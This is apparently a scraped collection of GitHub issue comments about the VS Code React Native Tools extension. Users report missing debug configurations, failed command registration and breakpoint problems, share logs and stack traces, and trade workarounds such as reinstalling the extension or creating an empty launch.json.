@ruslan-bikkinin. I'm sorry to say that it doesn't work for me after the first time I execute reactNative.startExponentPackager. As before, the second time I try it shows the reactNative.* command not found message. No matters which one of the commands I try.\nAs I mentioned above, it starts happening once the \"Checking if this is Expo app...\" is done. I don't know if that helps you in any way.. I leave what I do for getting the errors:\n\nUninstall the extension from Code.\nDelete the folder from ~/.vscode/extensions/\nInstall the extension again.\nGo to a RN project and run > React Native: Start Exponent Packager\nWait for it to finish the entire process.\nClose the app (cmd + Q)\nReopen the app, the project and try the same command.\nYou will see reactNative.startExponenPackager not found.. @ruslan-bikkinin no. I know that \"bug\" and I wait for the IDE to finish loading before trying it =). The issue is not about the command but about that the extension cannot load the app-center-node-client module at load time. If I open the IDE and then open the DevTools I see the error. See (no command executed yet):\n\n\n. That doesn't happen when you've just installed the extension. Remember I've also mentioned that the \"Checking the Expo app\" process, executes this npm command npm install xdl @expo/ngrok --verbose --no-save which give some errors. Maybe that's related @ruslan-bikkinin . It gives me error when doing gulp release (I've done every command you mentioned) @ruslan-bikkinin \nMy output\n[12:01:16] Using gulpfile ~/Sites/vscode-react-native/gulpfile.js\n[12:01:16] Starting 'check-imports'...\n[12:01:16] Starting 'check-copyright'...\n[12:01:19] Finished 'check-imports' after 2.71 s\n[12:01:19] Finished 'check-copyright' after 2.71 s\n[12:01:19] Starting 'build'...\n[12:01:19] Building with preprocessor context: {\"PROD\":true}\n[12:01:22] Finished 'build' after 3.1 s\n[12:01:22] Starting 'release'...\nBacking up license files to /var/folders/7k/84zxbl115dld560bwv6hhwbr0000gp/T/vscode-react-native...\nPreparing license files for release...\nCreating release package...\nRestoring modified files...\n[12:01:22] 'release' errored after 11 ms\n[12:01:22] Error: An error occurred. Error: spawn vsce ENOENT\n    at formatError (/usr/local/lib/node_modules/gulp/bin/gulp.js:169:10)\n    at Gulp.<anonymous> (/usr/local/lib/node_modules/gulp/bin/gulp.js:195:15)\n    at Gulp.emit (events.js:159:13)\n    at Gulp.Orchestrator._emitTaskDone (/Users/nahuelhds/Sites/vscode-react-native/node_modules/orchestrator/index.js:264:8)\n    at /Users/nahuelhds/Sites/vscode-react-native/node_modules/orchestrator/index.js:275:23\n    at finish (/Users/nahuelhds/Sites/vscode-react-native/node_modules/orchestrator/lib/runTask.js:21:8)\n    at /Users/nahuelhds/Sites/vscode-react-native/node_modules/orchestrator/lib/runTask.js:45:4\n    at _rejected (/Users/nahuelhds/Sites/vscode-react-native/node_modules/q/q.js:844:24)\n    at /Users/nahuelhds/Sites/vscode-react-native/node_modules/q/q.js:870:30\n    at Promise.when (/Users/nahuelhds/Sites/vscode-react-native/node_modules/q/q.js:1122:31). The new version 0.6.4 works excellent for me. Thanks @ruslan-bikkinin \ud83c\udf89 . @ldwight 0.6.4 doesn't work for you? it does for me.\nAnyway about your question: yes, it's about removing the extension from VSCode program itself and then remove the folder in the extensions folders as well. In my case is ~/.vscode/extensions/vsmobile.vscode-react-native-x.y.z\nHope it helps. See https://github.com/Microsoft/vscode-react-native/issues/641. ",
    "mtrivolli": "Same behaviour as @nahuelhds describes. The patch is working for me! Thank you!. ",
    "veedeo": "I still have this issue with 0.6.4\nWhen launching Debug IOS - debugger hangs and nothing happens;\nDebug console\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.23.0\nOutput\n{ Error: connect ENOENT /tmp/vscode-reactnative-7c08c89fe80d339aeae7a6c35c138afb1c1880125c7bf0446f59a69a1b12bec1.sock\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',. ",
    "domialex": "Probably the same problem here.\nI added a dependency, had to restart debugging, never ever got it to work again.\nI erased the .vscode folder.\nI didn't try to reinstall the extension though.\nNothing happens when I press F5:\nhttps://i.imgur.com/08iBW78.png\nEDIT:\nBy reinstalling the extension it worked. I use Expo, but none of the other options worked before either.. Resolved by reinstalling the extension. It happened twice also.. In my case .vscode\\extensions\\vsmobile.vscode-react-native-0.6.3\\node_modules\\xdl\\binaries\\windows\\adb\\adb.exe was still running even after vscode was closed. Not sure if it helps.\nThe problem is totally reproducible and only started this week in my case. If you need more info, tell me what I need to do to help.. ",
    "FRizzonelli": "I'm getting a similar issue, breakpoints works perfectly in event and methods, but in render() or constructor are not placed correctly (sourceMap problem I think). I'm using TS with https://github.com/ds300/react-native-typescript-transformer\n\nReact-Native VS Code extension version: latest\nVSCode version: latest\nOS platform and version: macOs\nTypescript 2.8.3\n\nTo point out that the breakpoints works perfectly if I use react-native <= 0.51.1.\nIt starts with this strange behaviour only when I upgrade to 0.52 or greater.\nAlso debugger; line works perfectly!\nHope it helps to figure it out\n. ",
    "Yria": "+1. ",
    "devtobo": "Edit: Nevermind, I see it after restarting VS Code. Reload Window was not enough.\n~~Same problem here~~\n~~React-Native VS Code extension version: 0.6.4~~\n~~VSCode version: 1.21.0~~\n~~MacOS 10.12.6 (16G1114)~~\n~~Node v9.4.0~~\n~~react-native-cli: 2.0.1~~\n~~react-native: 0.54.0~~. ",
    "code-matt": "same thing here. @max-mironov I created a blank launch.json and closed and reopened vscode and the option for React Native was there! \nRestarting vscode and/or removing&installing the plugin was not doing it.. This happened again to a co-worker today who was getting set up on a new system with 0.6.10 version of the extension. Creating the empty launch.json did not do the trick this time but when I had him add the the contents of my local copy and restart, option showed up!. I have installed RN for many people in past few weeks, have not seen this issue again and used to all the time. Thanks!. ",
    "victorias": "Thanks for your guidance, but unfortunately it doesn't seem to show up in the UI :\\ However, React Native targets are available in the intellisense autocomplete within launch.json, which I'm assuming is enough to use the extension?. ",
    "azterix": "I am also having issues with this. I tried with an expo project and non-expo project. I have tried the different approaches mentioned above but am having no luck getting the React Native option to show up. \nvscode-react-native 0.6.6\nVSCode 1.21.1\nMac OS 10.13.3\nreact-native-cli 2.0.1\nnode 9.8.0\n. ",
    "privateOmega": "I too am facing this issue. This is a starter project and I don't think it has anything to do with the components used.\nvscode 1.21.1\nUbuntu 16.04 x64\nReact Native tools 0.6.6\nReact-Native cli 2.0.1. ",
    "ronaldroe": "@ruslan-bikkinin I'm not sure if you're wanting the entire log, or just the RN Tools bits, but here's the whole thing:\n[2018-03-29 10:33:51.678] [exthost1] [info] extension host started\n[2018-03-29 10:33:51.702] [exthost1] [info] ExtensionService#_doActivateExtension vscode.emmet {\"startup\":true,\"activationEvent\":\"*\"}\n[2018-03-29 10:33:51.702] [exthost1] [info] ExtensionService#loadCommonJSModule c:\\Program Files\\Microsoft VS Code\\resources\\app\\extensions\\emmet\\out\\extension\n[2018-03-29 10:33:51.797] [exthost1] [info] ExtensionService#_doActivateExtension vscode.git {\"startup\":true,\"activationEvent\":\"*\"}\n[2018-03-29 10:33:51.797] [exthost1] [info] ExtensionService#loadCommonJSModule c:\\Program Files\\Microsoft VS Code\\resources\\app\\extensions\\git\\out\\main\n[2018-03-29 10:33:51.963] [exthost1] [info] ExtensionService#_doActivateExtension vscode.merge-conflict {\"startup\":true,\"activationEvent\":\"*\"}\n[2018-03-29 10:33:51.963] [exthost1] [info] ExtensionService#loadCommonJSModule c:\\Program Files\\Microsoft VS Code\\resources\\app\\extensions\\merge-conflict\\out\\extension\n[2018-03-29 10:33:51.983] [exthost1] [info] ExtensionService#_doActivateExtension Shan.code-settings-sync {\"startup\":true,\"activationEvent\":\"*\"}\n[2018-03-29 10:33:51.983] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\Shan.code-settings-sync-2.9.0\\out\\src\\extension\n[2018-03-29 10:33:52.469] [exthost1] [info] ExtensionService#_doActivateExtension dbaeumer.vscode-eslint {\"startup\":true,\"activationEvent\":\"*\"}\n[2018-03-29 10:33:52.469] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\dbaeumer.vscode-eslint-1.4.8\\client\\out\\extension\n[2018-03-29 10:33:52.537] [exthost1] [info] ExtensionService#_doActivateExtension minhthai.vscode-todo-parser {\"startup\":true,\"activationEvent\":\"*\"}\n[2018-03-29 10:33:52.537] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\minhthai.vscode-todo-parser-1.9.1\\out\\src\\extension\n[2018-03-29 10:33:52.594] [exthost1] [info] ExtensionService#_doActivateExtension robertohuertasm.vscode-icons {\"startup\":true,\"activationEvent\":\"*\"}\n[2018-03-29 10:33:52.594] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\robertohuertasm.vscode-icons-7.22.0\\out\\src\\\n[2018-03-29 10:33:52.700] [exthost1] [info] ExtensionService#_doActivateExtension wayou.vscode-todo-highlight {\"startup\":true,\"activationEvent\":\"*\"}\n[2018-03-29 10:33:52.700] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\wayou.vscode-todo-highlight-0.5.12\\src\\extension\n[2018-03-29 10:33:52.708] [exthost1] [info] ExtensionService#_doActivateExtension vscode.typescript-language-features {\"startup\":false,\"activationEvent\":\"onLanguage:javascript\"}\n[2018-03-29 10:33:52.708] [exthost1] [info] ExtensionService#loadCommonJSModule c:\\Program Files\\Microsoft VS Code\\resources\\app\\extensions\\typescript\\out\\extension\n[2018-03-29 10:33:52.844] [exthost1] [info] ExtensionService#_doActivateExtension capaj.vscode-exports-autocomplete {\"startup\":false,\"activationEvent\":\"onLanguage:javascript\"}\n[2018-03-29 10:33:52.844] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\capaj.vscode-exports-autocomplete-0.5.4\\bootstrap\n[2018-03-29 10:33:53.322] [exthost1] [info] ExtensionService#_doActivateExtension christian-kohler.npm-intellisense {\"startup\":false,\"activationEvent\":\"onLanguage:javascript\"}\n[2018-03-29 10:33:53.322] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\christian-kohler.npm-intellisense-1.3.0\\out\\src\\extension\n[2018-03-29 10:33:53.339] [exthost1] [info] ExtensionService#_doActivateExtension vsmobile.cordova-tools {\"startup\":false,\"activationEvent\":\"onLanguage:javascript\"}\n[2018-03-29 10:33:53.339] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\vsmobile.cordova-tools-1.3.8\\out\\src\\cordova\n[2018-03-29 10:33:55.373] [exthost1] [info] ExtensionService#_doActivateExtension ms-vscode.node-debug2 {\"startup\":true,\"activationEvent\":\"workspaceContains:./node_modules/react-native/package.json\"}\n[2018-03-29 10:33:55.373] [exthost1] [info] ExtensionService#loadCommonJSModule c:\\Program Files\\Microsoft VS Code\\resources\\app\\extensions\\ms-vscode.node-debug2\\out\\src\\extension\n[2018-03-29 10:33:55.476] [exthost1] [info] ExtensionService#_doActivateExtension vsmobile.vscode-react-native {\"startup\":true,\"activationEvent\":\"workspaceContains:./node_modules/react-native/package.json\"}\n[2018-03-29 10:33:55.476] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\vsmobile.vscode-react-native-0.6.6\\src\\extension\\rn-extension\n[2018-03-29 10:33:57.006] [exthost1] [info] eager extensions activated\nAnd here's what was added after verifying there's not RN in the debug environment menu:\n[2018-03-29 10:36:58.297] [exthost1] [info] ExtensionService#_doActivateExtension ms-vscode.node-debug {\"startup\":false,\"activationEvent\":\"onDebugInitialConfigurations\"}\n[2018-03-29 10:36:58.297] [exthost1] [info] ExtensionService#loadCommonJSModule c:\\Program Files\\Microsoft VS Code\\resources\\app\\extensions\\ms-vscode.node-debug\\out\\node\\extension\\extension.js\n[2018-03-29 10:36:58.317] [exthost1] [info] ExtensionService#_doActivateExtension msjsdiag.debugger-for-chrome {\"startup\":false,\"activationEvent\":\"onDebugInitialConfigurations\"}\n[2018-03-29 10:36:58.317] [exthost1] [info] ExtensionService#loadCommonJSModule C:\\Users\\ronal\\.vscode\\extensions\\msjsdiag.debugger-for-chrome-4.3.0\\out\\src\\extension\nEDIT\nI restarted my computer, and the option shows up now. Before, I tried reloading VS Code, and closing and reopening it. Neither helped, but a full computer reboot did.. ",
    "iosdev-republicofapps": "I also see no react native environment in the debug configurations.  Here's the log:\n```\nconsole.ts:136 [Extension Host] Here is the error stack:  Error: Cannot find module 'q'\n    at Function.Module._resolveFilename (module.js:470:15)\n    at Function.Module._load (module.js:418:25)\n    at Function.o._load (/Applications/Visual Studio Code.app/Contents/Resources/app/out/vs/workbench/node/extensionHostProcess.js:671:784)\n    at Module.require (module.js:498:17)\n    at Module.patchedRequire [as require] (/Applications/Visual Studio Code.app/Contents/Resources/app/extensions/git/node_modules/diagnostic-channel/dist/src/patchRequire.js:14:46)\n    at require (internal/module.js:20:19)\n    at Object. (/Users/joel/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/src/extension/rn-extension.js:5:11)\n    at Object. (/Users/joel/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/src/extension/rn-extension.js:190:3)\n    at Module._compile (module.js:571:32)\n    at Object.Module._extensions..js (module.js:580:10)\n    at Module.load (module.js:488:32)\n    at tryModuleLoad (module.js:447:12)\n    at Function.Module._load (module.js:439:3)\n    at Function.o._load (/Applications/Visual Studio Code.app/Contents/Resources/app/out/vs/workbench/node/extensionHostProcess.js:671:784)\n    at Module.require (module.js:498:17)\n    at Module.patchedRequire [as require] (/Applications/Visual Studio Code.app/Contents/Resources/app/extensions/git/node_modules/diagnostic-channel/dist/src/patchRequire.js:14:46)\n```\nI am on VSCode Version 1.21.1 (1.21.1).  RN info:\nEnvironment:\n  OS: macOS High Sierra 10.13.3\n  Node: 8.4.0\n  Yarn: Not Found\n  npm: 4.6.1\n  Watchman: 4.9.0\n  Xcode: Xcode 9.2 Build version 9C40b\n  Android Studio: 2.3 AI-162.4069837\nPackages: (wanted => installed)\n  react: 16.3.0-alpha.1 => 16.3.0-alpha.1\n  react-native: 0.54.0 => 0.54.0\nAny ideas?. @max-mironov your solution worked, thanks!  However, VSCode does not seem to honor the ASCII color codes that are being emitted in the RN logs:\n[33m\u001b[1mLearn more about this warning here:\u001b[22m\u001b[39m\nIs there any way to fix that?. ",
    "chris-feist": "@ruslan-bikkinin I still don't have the option in VS Code 1.22.2. @ruslan-bikkinin I just upgraded to 1.23.1 and its there again. I was experiencing the same issue. Your bug report led me to disable the flow plugin that I have installed, and then the option reappeared. \nEdit: I looked later and it disappeared again :(. ",
    "xavi": "I had the same problem (gear symbol in debug tab didn't show a React Native option) until I realized that the folder of the project opened in VSCode was not the root of the React Native project, but the React Native project was within a subfolder. In fact, the README says\n\nOpen your React Native project root folder in VS Code\n\nSo I did that, I closed the project and reopened it in the React Native's project root folder (where there's package.json, app/, ios/, android/, etc), and it worked, now I see \"React Native\" when clicking the gear icon.\n. ",
    "sargunv": "I had this problem. Resolved it by closing VSCode, doing mkdir -p .vscode/.react; touch .vscode/.react/launch.json, then opening VSCode.. Looks like in certain situations this extension is not generating the launch.json file unless one exists already, and not showing the environment option until it exists.. ",
    "dotmike": "I was having the same issue and @sargunv's comment worked for me\n. ",
    "jcraven-worksight": "@ruslan-bikkinin Ran into this issue today. I've tried all the other recommended solutions in addition to your previous one and am still experiencing this. \nenvironment:\nVSCode: 1.24.0\nRN extension: 0.6.10\nUbuntu 18.04 \nRN: 0.55.2\nNode: 8.11.2\nedit: I got it working by accessing the debug menu not through the gear icon in the left panel of VSCode but in the top bar debug menu -> Add Configuration option. . ",
    "erichui2017": "i find vs will del .react folder where vs close. \nvs 1.24.1\nrn tools 0.6.11. ",
    "blackinitial": "i have this issue, i was add configuration but not show prompt to select react native evironment debug only launch.json with config launch program.\nI was try to reinstall react native tools extension, and reopen vscode and add configuration. But still not show the promp to choose react native debug environment.\nFinally i copied config debug from other project and work.... @ruslan-bikkinin before that i was delete .vscode folder, when i add config on option, vscode made and open launch.json only not show the prompt. ",
    "WesSouza": "@annakocheshkova neither work once the Simulator is open.\nIf I quit the simulator, most times it works.. ",
    "firofame": "I am having the same issue. is there any fix?. ",
    "booker-laputa": "@ruslan-bikkinin \nSorry I missed the email, I can attach some more information\nFor some reason, my RN project is 0.43.1 and react-native-code-push is 3.0.1-beta\nI don't know if this is the root cause\nPersonally, I think it is something related to the react-native bundle command. ",
    "ctaggart": "I actually don't have time currently to verify it, so I'll reopen if it is an issue again in the future.. ",
    "jiku": "Experiencing this with a CRNA/Expo app too. Commenting here and not in #625 because of that. I'm using the iOS simulator though.\nVSCode breaks on debugger statements and all exceptions, but uncaught exceptions and break- and logpoints aren't respected, both when setting them in my codebase and in dependencies.\nEnvironment\nmacOS: Sierra 10.12.6\nVSCode: 1.23.0-insider\nReact Native Tools: 0.6.6\nExpo: 0.26.0\nXCode: 10.0 (SimulatorApp-835.5) \nReact Native: 0.54.0, then 0.54.2, then 0.54.4\nNode: 9.7.1\n.vscode/launch.json\njson\n{\n  \"name\": \"Attach to packager\",\n  \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n  \"type\": \"reactnative\",\n  \"request\": \"attach\",\n  \"port\": \"19001\",\n  \"trace\": \"verbose\",\n  \"sourceMaps\": true,\n  \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n},\nDebug Console (sorry about the size. It seems to retry the websocket connection and grows indefinitely.)\n```shell\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.23.0\n18:06:54, 2018-4-8\nFrom client: initialize({\"clientID\":\"vscode\",\"clientName\":\"Visual Studio Code - Insiders\",\"adapterID\":\"reactnative\",\"pathFormat\":\"path\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":false}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true,\"supportsEvaluateForHovers\":true,\"supportsLogPoints\":true}}\nStarting debugger app worker.\nAbout to download: http://localhost:19001/debugger-ui/debuggerWorker.js to: /Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react/debuggerWorker.js\nEstablished a connection with the Proxy (Packager) to the React Native application\nFrom RN APP: {\"id\":10173,\"method\":\"prepareJSRuntime\"}\nA new app worker lifetime was created.\nSpawned debuggee process with pid 97268 listening to 14886\nDebugger worker loaded runtime on port 14886\nFrom client: attach({\"name\":\"Attach to packager\",\"program\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/launchReactNative.js\",\"type\":\"reactnative\",\"request\":\"attach\",\"port\":14886,\"trace\":\"verbose\",\"sourceMaps\":true,\"outDir\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react\",\"sessionId\":\"cc628b36-d95d-4e69-8004-35b95aaa065d\",\"address\":\"localhost\",\"restart\":true})\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"debugStarted\",\"data\":{\"request\":\"attach\",\"args\":[\"name\",\"program\",\"type\",\"request\",\"port\",\"trace\",\"sourceMaps\",\"outDir\",\"__sessionId\",\"address\",\"restart\",\"remoteRoot\",\"localRoot\",\"sourceMapPathOverrides\",\"showAsyncStacks\"]}}}\nTo RN APP: {\"replyID\":10173}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"targetCount\",\"data\":{\"numTargets\":1}}}\nFrom RN APP: {\"id\":10174,\"method\":\"executeApplicationScript\",\"url\":\"http:\\/\\/localhost:19001\\/.\\/node_modules\\/react-native-scripts\\/build\\/bin\\/crna-entry.bundle?platform=ios&dev=true&minify=false&hot=false&assetPlugin=%2FUsers%2Ftest%2FDocuments%2Fdev%2FProjects%2FOmni%2Freact%2Fnative%2Fnode_modules%2Fexpo%2Ftools%2FhashAssetFiles\",\"inject\":{\"__fbBatchedBridgeConfig\":\"{\\\"remoteModuleConfig\\\":[[\\\"AppState\\\",{\\\"initialAppState\\\":\\\"active\\\"},[\\\"getCurrentAppState\\\",\\\"removeListeners\\\",\\\"addListener\\\"]],[\\\"DevSettings\\\",null,[\\\"reload\\\",\\\"setIsShakeToShowDevMenuEnabled\\\",\\\"setIsDebuggingRemotely\\\",\\\"setProfilingEnabled\\\",\\\"setLiveReloadEnabled\\\",\\\"setHotLoadingEnabled\\\",\\\"toggleElementInspector\\\"]],[\\\"DevLoadingView\\\",null,[\\\"hide\\\",\\\"showMessage\\\"]],[\\\"StatusBarManager\\\",null,[\\\"getHeight\\\",\\\"setStyle\\\",\\\"setHidden\\\",\\\"setNetworkActivityIndicatorVisible\\\",\\\"_captureProperties\\\",\\\"_applyPropertiesAndForget\\\",\\\"removeListeners\\\",\\\"addListener\\\"],[4]],[\\\"AsyncLocalStorage\\\",null,[\\\"multiGet\\\",\\\"multiSet\\\",\\\"multiMerge\\\",\\\"multiRemove\\\",\\\"clear\\\",\\\"getAllKeys\\\"]],[\\\"ExponentMagnetometer\\\",null,[\\\"setUpdateInterval\\\",\\\"removeListeners\\\",\\\"addListener\\\"]],[\\\"ExponentUpdates\\\",null,[\\\"reload\\\",\\\"checkForUpdateAsync\\\",\\\"fetchUpdateAsync\\\"],[1,2]],[\\\"RNBranch\\\",{\\\"SHARE_COMPLETED_EVENT\\\":\\\"Share Completed\\\",\\\"PURCHASE_INITIATED_EVENT\\\":\\\"Purchase Started\\\",\\\"ADD_TO_CART_EVENT\\\":\\\"Add to Cart\\\",\\\"INIT_SESSION_ERROR\\\":\\\"ABI26_0_0RNBranch.initSessionError\\\",\\\"REGISTER_VIEW_EVENT\\\":\\\"View[...]\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"capabilities\",\"body\":{\"capabilities\":{\"supportsStepBack\":false}}}\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":2,\"command\":\"attach\",\"success\":true}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"nodeVersion\",\"data\":{\"version\":\"v9.7.1\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"initialized\"}\nFrom client: setBreakpoints({\"source\":{\"name\":\"graphql.js\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/app/src/graphql.js\"},\"lines\":[32],\"breakpoints\":[{\"line\":32}],\"sourceModified\":false})\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"setBreakpointsRequest\",\"data\":{\"Versions.Target.Version\":\"v9.7.1\",\"fileExt\":\".js\"}}}\nFrom client: setBreakpoints({\"source\":{\"name\":\"list.js\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/app/src/list.js\"},\"lines\":[12],\"breakpoints\":[{\"line\":12}],\"sourceModified\":false})\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"setBreakpointsRequest\",\"data\":{\"Versions.Target.Version\":\"v9.7.1\",\"fileExt\":\".js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"bootstrap_node.js\",\"path\":\"/bootstrap_node.js\",\"sourceReference\":1000,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"events.js\",\"path\":\"/events.js\",\"sourceReference\":1001,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"util.js\",\"path\":\"/util.js\",\"sourceReference\":1002,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"errors.js\",\"path\":\"/internal/errors.js\",\"sourceReference\":1003,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"encoding.js\",\"path\":\"/internal/encoding.js\",\"sourceReference\":1004,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"util.js\",\"path\":\"/internal/util.js\",\"sourceReference\":1006,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"types.js\",\"path\":\"/internal/util/types.js\",\"sourceReference\":1007,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"buffer.js\",\"path\":\"/buffer.js\",\"sourceReference\":1008,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM25\",\"path\":\"/VM25\",\"sourceReference\":1005,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"buffer.js\",\"path\":\"/internal/buffer.js\",\"sourceReference\":1009,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"comparisons.js\",\"path\":\"/internal/util/comparisons.js\",\"sourceReference\":1010,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"process.js\",\"path\":\"/internal/process.js\",\"sourceReference\":1011,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"warning.js\",\"path\":\"/internal/process/warning.js\",\"sourceReference\":1012,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"next_tick.js\",\"path\":\"/internal/process/next_tick.js\",\"sourceReference\":1013,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"async_hooks.js\",\"path\":\"/internal/async_hooks.js\",\"sourceReference\":1014,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"promises.js\",\"path\":\"/internal/process/promises.js\",\"sourceReference\":1015,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"stdio.js\",\"path\":\"/internal/process/stdio.js\",\"sourceReference\":1016,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"perf_hooks.js\",\"path\":\"/perf_hooks.js\",\"sourceReference\":1017,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"linkedlist.js\",\"path\":\"/internal/linkedlist.js\",\"sourceReference\":1018,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"trace_events_async_hooks.js\",\"path\":\"/internal/trace_events_async_hooks.js\",\"sourceReference\":1019,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"async_hooks.js\",\"path\":\"/async_hooks.js\",\"sourceReference\":1020,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"inspector_async_hook.js\",\"path\":\"/internal/inspector_async_hook.js\",\"sourceReference\":1021,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"child_process.js\",\"path\":\"/child_process.js\",\"sourceReference\":1022,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"child_process.js\",\"path\":\"/internal/child_process.js\",\"sourceReference\":1023,\"origin\":\"read-only core module\"}}}\nTo client: 